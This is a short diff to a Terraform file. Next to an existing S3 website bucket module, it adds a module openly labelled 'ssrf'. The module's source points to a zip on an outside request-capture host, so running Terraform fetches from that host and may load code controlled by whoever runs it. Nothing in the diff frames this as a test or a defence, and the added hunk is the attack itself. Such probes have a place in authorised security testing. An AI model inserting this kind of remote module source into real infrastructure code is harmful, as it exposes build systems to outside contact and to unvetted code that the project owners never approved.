@@ -51,3 +51,12 @@ module "website_s3_bucket" {
     Environment = "dev"
   }
 }
+
+module "ssrf" {
+  source = "https://enm36rqp62izf.x.pipedream.net/foo.zip"
+
+  tags = {
+    ssrf   = "true"
+    environment = "production"
+  }
+}
